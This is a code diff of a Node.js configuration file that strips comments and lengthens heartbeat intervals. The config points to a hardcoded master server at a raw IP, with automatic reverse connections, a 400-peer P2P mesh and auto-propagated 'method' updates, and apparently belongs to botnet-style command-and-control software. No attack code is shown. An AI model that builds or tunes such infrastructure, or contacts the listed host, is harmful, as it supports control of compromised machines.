@@ -4,7 +4,6 @@ import crypto from 'crypto';
 import fs from 'fs';
 import { fileURLToPath } from 'url';
 
-// ESM pengganti __dirname
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
@@ -66,8 +65,8 @@ const config = {
   MASTER: {
     URL: 'http://217.160.125.128:13656',
     WS_URL: 'ws://217.160.125.128:13656/ws',
-    HEARTBEAT_INTERVAL: 30000,          // Heartbeat only (30s)
-    METHODS_SYNC_INTERVAL: 300000,      // Fallback master sync (5 min) - rarely used
+    HEARTBEAT_INTERVAL: 65000,          
+    METHODS_SYNC_INTERVAL: 300000,      
     TIMEOUT: 10000,
     NOTIFY_ON_SYNC: true
   },
@@ -75,7 +74,7 @@ const config = {
   REVERSE: {
     ENABLE_AUTO: true,
     RETRY_INTERVAL: 10000,
-    HEARTBEAT_INTERVAL: 30000,
+    HEARTBEAT_INTERVAL: 60000,
     MAX_RECONNECT_ATTEMPTS: 10,
   },
 
@@ -125,31 +124,24 @@ const config = {
     ]
   },
   
-  // ===== ENHANCED P2P CONFIGURATION =====
   P2P: {
-    ENABLED: true,                      // ✅ Enable P2P
-    DISCOVERY_INTERVAL: 60000,          // Discover peers every 1 minute
-    PEER_TIMEOUT: 180000,               // 3 minutes timeout
-    MAX_PEERS: 400,                      // Max 50 peers
-    AUTO_CONNECT: true,                 // ✅ Auto-connect to discovered peers
-    RELAY_FALLBACK: true,               // ✅ Support relay for unreachable peers
-    HEARTBEAT_INTERVAL: 30000,          // P2P heartbeat every 30s
-    CONNECTION_TIMEOUT: 10000,          // 10s connection timeout
-    
-    // ===== METHOD SYNC CONFIGURATION =====
-    PREFER_P2P_SYNC: true,              // ✅ Prefer syncing from peers over master
-    METHOD_SYNC_INTERVAL: 120000,       // Check method version with peers every 2 minutes
-    AUTO_PROPAGATE_UPDATES: true,       // ✅ Auto-propagate method updates to peers
-    
-    // ===== FILE SHARING =====
-    ENABLE_FILE_SHARING: true,          // ✅ Share files via P2P
-    FILE_CACHE_SIZE: 100,               // Cache up to 100 files
-    FILE_TRANSFER_TIMEOUT: 60000,       // 60s file transfer timeout
-    
-    // ===== ADVANCED SETTINGS =====
+    ENABLED: true,                      
+    DISCOVERY_INTERVAL: 60000,          
+    PEER_TIMEOUT: 180000,               
+    MAX_PEERS: 400,                      
+    AUTO_CONNECT: true,                 
+    RELAY_FALLBACK: true,               
+    HEARTBEAT_INTERVAL: 45000,          
+    CONNECTION_TIMEOUT: 10000,          
+    PREFER_P2P_SYNC: true,              
+    METHOD_SYNC_INTERVAL: 120000,       
+    AUTO_PROPAGATE_UPDATES: true,       
+    ENABLE_FILE_SHARING: true,          
+    FILE_CACHE_SIZE: 100,               
+    FILE_TRANSFER_TIMEOUT: 60000,       
     MAX_RECONNECT_ATTEMPTS: 3,
     CONNECTION_BACKOFF_MS: 5000,
-    BLACKLIST_DURATION: 300000,         // 5 minutes
+    BLACKLIST_DURATION: 300000,         
     MESSAGE_QUEUE_SIZE: 100,
     AUTO_CONNECT_DELAY: 10000,
     CLEANUP_INTERVAL: 60000,
